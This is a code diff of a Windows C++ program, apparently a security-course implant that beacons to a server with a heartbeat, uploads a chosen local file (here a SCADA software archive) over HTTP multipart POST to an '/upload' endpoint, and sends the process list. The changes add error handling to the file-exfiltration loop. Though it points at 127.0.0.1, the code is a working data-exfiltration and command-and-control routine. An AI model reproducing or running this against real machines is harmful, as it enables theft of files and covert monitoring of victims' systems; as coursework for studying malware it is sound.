@@ -17,18 +17,18 @@ using namespace std;
 #define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
 #define FREE(x) HeapFree(GetProcessHeap(), 0, (x))
 
-
+//Uploads file to server
+//Params: handle for internet, path of file to upload 
 BOOL doFileUpload(HANDLE hInternet, char* filepath) {
 	//https://stackoverflow.com/questions/6407755/how-to-send-a-zip-file-using-wininet-in-my-vc-application
 	char hdrs[] = "Content-Type: multipart/form-data; boundary=CSEC476";
-	char head[] = "--CSEC476\r\nContent-Disposition: form-data; name=\"userfile\"; filename=\"test.bin\"\r\nContent-Type: application/octet-stream\r\n\r\n";
+	char head[] = "--CSEC476\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.bin\"\r\nContent-Type: application/octet-stream\r\n\r\n";
 	char tail[] = "\r\n--CSEC476--\r\n";
 	char data[2048] = {};
 	DWORD bytesWritten = 0;
 	DWORD bytesRead = 0;
 	HANDLE hFile = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	DWORD dataSize = GetFileSize(hFile, NULL);
-
 
 	HANDLE hConnect = InternetConnectA(hInternet, "127.0.0.1", 5000, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
 	HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/upload", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
@@ -41,15 +41,15 @@ BOOL doFileUpload(HANDLE hInternet, char* filepath) {
 
 	HttpSendRequestExA(hRequest, &bufferIn, NULL, HSR_INITIATE, 0);
 	InternetWriteFile(hRequest, (const void*)head, strlen(head), &bytesWritten);
-
 	do {
-		ReadFile(hFile, &data, sizeof(data), &bytesRead, NULL);
+		if (!ReadFile(hFile, &data, sizeof(data), &bytesRead, NULL)) {
+			HttpEndRequest(hRequest, NULL, HSR_INITIATE, 0);
+			return FALSE;
+		}
 		cout << bytesRead << "\n";
 		InternetWriteFile(hRequest, (const void*)data, bytesRead, &bytesWritten);
 		cout << bytesWritten << "\n";
 	} while (bytesRead == sizeof(data));
-
-	//InternetWriteFile(hRequest, (const void*)data, dataSize, &bytesWritten); // or a while loop for call InternetWriteFile every 1024 bytes...
 	InternetWriteFile(hRequest, (const void*)tail, strlen(tail), &bytesWritten);
 	HttpEndRequest(hRequest, NULL, HSR_INITIATE, 0);
 	return TRUE;
@@ -250,10 +250,8 @@ int main() {
 	HANDLE hConnect = InternetConnectA(hInternet, IP, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
 	HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/heartbeat", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
 
-	//const char* pth = "C:\\Users\\shell\\Documents\\McLellan_Jake_462Lab3.docx";
 	const char* pth = "C:\\Users\\shell\\Downloads\\scada_5.8.2_full_en.zip";
 	doFileUpload(hInternet, (char*)pth);
-	system("pause");
 
 
 	//Sends Process List to Server
